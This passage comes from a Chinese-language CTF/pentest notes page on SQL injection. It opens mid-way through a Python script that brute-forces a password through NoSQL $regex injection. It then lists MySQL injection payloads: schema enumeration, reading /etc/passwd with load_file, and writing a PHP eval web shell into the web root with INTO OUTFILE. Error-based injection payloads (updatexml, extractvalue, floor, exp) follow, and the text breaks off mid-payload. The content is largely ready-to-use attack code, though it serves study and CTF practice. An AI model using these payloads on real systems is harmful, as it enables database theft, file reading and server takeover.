class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token string" style="color:#e3116c">&#x27;username[$regex]&#x27;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain">payload1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;password[$ne]&#x27;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        payload2 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string-interpolation string" style="color:#e3116c">f&#x27;^</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">tmp</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">.*$&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        data2 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token string" style="color:#e3116c">&#x27;username[$regex]&#x27;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token string" style="color:#e3116c">&#x27;flag&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                 </span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;password[$regex]&#x27;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain">payload2</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        r </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> requests</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">post</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">url</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">url</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> data</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">data2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">text</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">r&quot;\u767b\u9646\u6210\u529f&quot;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> r</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            flag </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> j</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">break</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>至此，整个sql部分到此结束</p>
<h1>南神笔记</h1>
<p><a href="https://www.yuque.com/docs/share/64040225-21c1-4270-9bdd-ed78643b9292?#VqtAB" target="_blank" rel="noopener noreferrer">https://www.yuque.com/docs/share/64040225-21c1-4270-9bdd-ed78643b9292?#VqtAB</a></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="常用语句">常用语句<a href="#常用语句" class="hash-link" aria-label="Direct link to 常用语句" title="Direct link to 常用语句">​</a></h2>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">当前用户：</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">user</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">数据库版本：</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> version</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> @</span><span class="token variable" style="color:#36acaa">@version</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">数据库名：</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">database</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">操作系统：</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> @</span><span class="token variable" style="color:#36acaa">@version_compile_os</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">所有变量：</span><span class="token keyword" style="color:#00009f">show</span><span class="token plain"> variables</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">单个变量：</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> @</span><span class="token variable" style="color:#36acaa">@secure_file_priv</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">show</span><span class="token plain"> variables </span><span class="token operator" style="color:#393A34">like</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;secure_file_%&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">爆字段数：</span><span class="token keyword" style="color:#00009f">order</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain"> ，</span><span class="token keyword" style="color:#00009f">group</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">查库名：</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> group_concat</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">schema_name</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> information_schema</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">schemata</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">查表名：</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> group_concat</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">table_name</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> information_schema</span><span class="token punctuation" style="color:#393A34">.</span><span class="token keyword" style="color:#00009f">tables</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> table_schema</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;库名&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">查字段：</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> group_concat</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">column_name</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> information_schema</span><span class="token punctuation" style="color:#393A34">.</span><span class="token keyword" style="color:#00009f">columns</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> table_name</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;表名&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">读取某行：</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> mysql</span><span class="token punctuation" style="color:#393A34">.</span><span class="token keyword" style="color:#00009f">user</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">limit</span><span class="token plain"> n</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">m </span><span class="token comment" style="color:#999988;font-style:italic">// limit m offset n （第n行之后m行，第一行为0）</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">读文件：</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> load_file</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;/etc/passwd&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">写文件：</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;&lt;?php @eval($_POST[a]);?&gt;&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">into</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">outfile</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;/var/www/html/a.php&#x27;</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic">//该处文件名无法使用16进制绕过</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2></h2>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="常用函数">常用函数<a href="#常用函数" class="hash-link" aria-label="Direct link to 常用函数" title="Direct link to 常用函数">​</a></h2>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">截取字符串：substr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;abc&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">、substring</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;abc&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">、</span><span class="token keyword" style="color:#00009f">left</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;abc&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">、</span><span class="token keyword" style="color:#00009f">right</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;abc&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">，</span><span class="token function" style="color:#d73a49">mid</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;abc&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">字符串拼接：concat</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;a&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;b&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;c&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">，concat_ws</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27; &#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;a&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;b&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;c&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">字符串反转：reverse</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">多行拼接：group_concat </span><span class="token comment" style="color:#999988;font-style:italic">//eg: select group_concat(user) from mysql.user</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">时延函数：sleep</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">5</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">、benchmark</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">10000000</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">md5</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;123456&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">//其他方法get_lock()，笛卡尔，rlike等</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">编码函数: hex、ord、ascii、</span><span class="token keyword" style="color:#00009f">char</span><span class="token plain">、conv</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">255</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">10</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">16</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">FF（</span><span class="token number" style="color:#36acaa">2</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">36</span><span class="token plain">进制转换）</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">布尔条件：</span><span class="token keyword" style="color:#00009f">if</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">、position</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;a&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">in</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;abc&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">、elt</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;a&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;b&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">a</span><span class="token operator" style="color:#393A34">&amp;&amp;</span><span class="token plain">elt</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;a&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;b&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">b、</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">case</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">when</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">bool</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">then</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">else</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">end</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">、field</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;a&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">3</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;a&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">3</span><span class="token plain">、</span><span class="token keyword" style="color:#00009f">nullif</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;a&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;b&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">1</span><span class="token operator" style="color:#393A34">&amp;&amp;</span><span class="token keyword" style="color:#00009f">nullif</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;a&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;a&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">=</span><span class="token boolean" style="color:#36acaa">null</span><span class="token plain">、strcmp、</span><span class="token operator" style="color:#393A34">regexp</span><span class="token plain">、</span><span class="token operator" style="color:#393A34">rlike</span><span class="token plain">、regexp_like</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="-1"><a href="#-1" class="hash-link" aria-label="Direct link to -1" title="Direct link to -1">​</a></h2>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="注入类型">注入类型<a href="#注入类型" class="hash-link" aria-label="Direct link to 注入类型" title="Direct link to 注入类型">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="报错注入">报错注入<a href="#报错注入" class="hash-link" aria-label="Direct link to 报错注入" title="Direct link to 报错注入">​</a></h3>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token number" style="color:#36acaa">1.</span><span class="token plain">floor</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">count</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">concat</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">version</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">floor</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">rand</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">*</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">x </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> information_schema</span><span class="token punctuation" style="color:#393A34">.</span><span class="token keyword" style="color:#00009f">tables</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">group</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> x</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">a</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">2.</span><span class="token plain">updatexml</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">//5.1.5</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token operator" style="color:#393A34">=</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">updatexml</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">concat</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x3a</span><span class="token punctuation" style="color:#393A34">,</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">user</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">3.</span><span class="token plain">extractvalue</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">//5.1.5</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> extractvalue</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">concat</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x5c</span><span class="token punctuation" style="color:#393A34">,</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">user</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">4.</span><span class="token plain">exp</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">//5.5.5版本之后可以使用</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> host </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">user</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">user</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;root&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> Exp</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">~</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> version</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">a</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">5.</span><span class="token plain">name_const </span><span class="token comment" style="color:#999988;font-style:italic">//支持老版本</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> NAME_CONST</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">version</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">NAME_CONST</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">version</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">x</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">6.</span><span class="token keyword" style="color:#00009f">geometrycollection</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">，</span><span class="token 